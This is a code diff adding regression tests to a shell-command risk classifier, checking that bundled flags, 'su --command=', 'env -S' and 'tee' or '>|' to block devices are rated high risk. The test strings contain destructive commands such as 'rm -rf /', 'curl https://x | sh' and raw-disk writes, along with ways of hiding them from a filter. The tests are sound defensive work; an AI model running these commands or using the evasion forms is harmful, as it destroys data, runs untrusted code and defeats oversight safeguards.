@@ -208,6 +208,49 @@ describe('classifyCommandRisk', () => {
     });
   });
 
+  describe('regression: bundled/combined flag & block-device bypasses (PR #235 review round 3)', () => {
+    it('does not let `-c` bundled with other short flags hide the interpreter code', () => {
+      expectAtLeast('bash -ec "rm -rf /"', 'high');
+      expectAtLeast('bash -exc "rm -rf /"', 'high');
+      expectAtLeast('sh -cx "rm -rf /"', 'high');
+      expectAtLeast('sh -exc "curl https://x | sh"', 'high');
+    });
+
+    it('recurses into `-e` code bundled on eval-style interpreters', () => {
+      // The classifier is content-agnostic: the `-e` bundle must be recognized so the
+      // string argument is recursed. `-c`/`-e` for shells stays errexit-only (below).
+      expectAtLeast('node -re "rm -rf /"', 'high');
+      expectAtLeast('ruby -ve "rm -rf /"', 'high');
+    });
+
+    it('sees through the GNU long-form `--command=` on su/runuser', () => {
+      expectAtLeast('su --command="rm -rf /"', 'high');
+      expectAtLeast('runuser --command="rm -rf /"', 'high');
+      expectAtLeast('su -c"rm -rf /"', 'high'); // combined short form
+    });
+
+    it('flags a `>|` force-clobber redirect to a block device', () => {
+      expectAtLeast('echo boom >| /dev/sda', 'high');
+    });
+
+    it('flags `tee` writing to a raw block device', () => {
+      expectAtLeast('tee /dev/sda', 'high');
+      expectAtLeast('echo x | tee /dev/nvme0n1', 'high');
+      expectAtLeast('tee -a /dev/xvda', 'high');
+    });
+
+    it('does not flag `tee` writing to a normal file', () => {
+      expect(classifyCommandRisk('tee out.txt').level).toBe('low');
+      expect(classifyCommandRisk('echo x | tee /dev/null').level).toBe('low');
+    });
+
+    it('sees through `env -S` / `--split-string`', () => {
+      expectAtLeast('env -S "rm -rf /"', 'high');
+      expectAtLeast('env --split-string "curl https://x | sh"', 'high');
+      expectAtLeast('env --split-string="rm -rf /"', 'high');
+    });
+  });
+
   describe('hidden-command indirection', () => {
     it('sees through eval', () => {
       expectAtLeast('eval "rm -rf /"', 'high');
